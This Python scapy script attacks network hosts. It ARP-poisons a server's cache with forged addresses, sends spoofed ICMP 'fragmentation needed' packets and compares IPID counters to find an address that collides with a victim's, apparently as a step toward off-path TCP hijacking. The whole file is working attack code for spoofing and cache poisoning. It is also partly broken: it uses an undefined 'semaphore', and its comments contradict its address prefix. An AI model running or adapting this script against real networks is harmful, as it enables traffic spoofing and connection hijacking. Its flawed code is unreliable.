import struct
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

# coding=utf-8


forge_ip_prefix = '10.10.'                  # used for construct a address pool
victim_ip = '10.10.100.1'                   # victim ip address
server_ip = '10.10.100.2'                   # server ip address
server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
my_if_name = 'enps03'                        # bind one ethernet interface
my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
z_payload = b''                             # full-zero byte string used for padding
NUM_T = 20                                  # number of checking thread

# Critical Resource
num1 = 2                                    # '100.100.' + num1
num2 = 2                                    # '100.100.num1.' + num2
found = False                               # collision address has been found?
result = 'no result'                        # collision result

def arp_inject(forged_ip):
    """
    Injects an ARP packet to poison the ARP cache of a target device.

    Args:
        forged_ip (str): The IP address to be forged.

    Returns:
        None
    """
    # here we send a UDP packet to allure server to execute ip/mac convert
    # if we got no reply, we can deduce that arp poisoned before is not expired now
    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
                iface=my_if_name, count=1, timeout=0.3, started_callback=
                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
                             iface=my_if_name, verbose=False))
    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
             iface=my_if_name, verbose=False)

def check_collision(forged_ip, D):
    """
    Check for collision between IP packets.

    This function checks for collision between IP packets by sending multiple packets
    and comparing their IP identification (IPID) values. It repeats the test `D` times
    to counter uncertainty.

    Args:
        forged_ip (str): The forged IP address to use in the packets.
        D (int): The number of times to repeat the test.

    Returns:
        bool: True if collision is detected, False otherwise.
    """
    negative = 0
    # repeat the test N times to counter uncertainty
    for i in range(0, D):
        # Note. we must use one sr() to send all three packets to reduce
        # the delay, and try to make sure the counter add only 1
        # Note. there must be a service on dst port. Because we want server
        # to reply a SYN-ACK rather than a RST
        pkts = sniff(filter="icmp and dst " + forged_ip,
                    iface=my_if_name, count=2, timeout=0.2, started_callback=
                    lambda: send([
                            IP(src=forged_ip, dst=server_ip) / ICMP(),
                            IP(src=victim_ip, dst=server_ip) / TCP(sport=RandShort(), dport=22, flags='S'),
                            IP(src=forged_ip, dst=server_ip) / ICMP()
                            ], iface=my_if_name, verbose=False))

        if len(pkts) == 2:
            ipid1 = pkts[0][1].fields['id']
            ipid2 = pkts[1][1].fields['id']

            if abs(ipid2 - ipid1) >= 2:
                negative += 1
            else:
                break

        else:
            i -= 1

    if negative == D:
        return True
    else:
        return False

def check_new():
    global found
    global num1
    global num2
    global result

    # if the result has been found or run out of addresses
    if found == True or num1 == 128:
        print(result)
        return

    # entry of critical zone
    forge_ip = forge_ip_prefix + str(num1) + '.' + str(num2)
    num2 += 1
    if num2 == 254:
        num2 = 2
        num1 += 1
        print('Now num1=' + str(num1))
    # print('Now we are checking ' + forge_ip)

    # before checking, we need to execute an ARP poison attack for forged ip address
    arp_inject(forge_ip)

    # Send fragment needed ICMP, force TCP set DF as 0
    send(IP(src=forge_ip, dst=server_ip) /
         ICMP(type=3, code=4, nexthopmtu=68) /
         IP(flags=2, src=server_ip, dst=victim_ip) /
         ICMP(type=0, code=0) /
         z_payload,
         iface=my_if_name, verbose=False)

    if check_collision(forge_ip, 1):
        # when an address is suspected of collision, we check it again and again
        if check_collision(forge_ip, 1) and check_collision(forge_ip, 2) and check_collision(forge_ip,8):
            semaphore.acquire()
            result = forge_ip
            found = True
            semaphore.release()
            print('Collision Found! ' + result)
    else:
        # print(forge_ip + ' no Collision.')
        pass

if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    check_new()
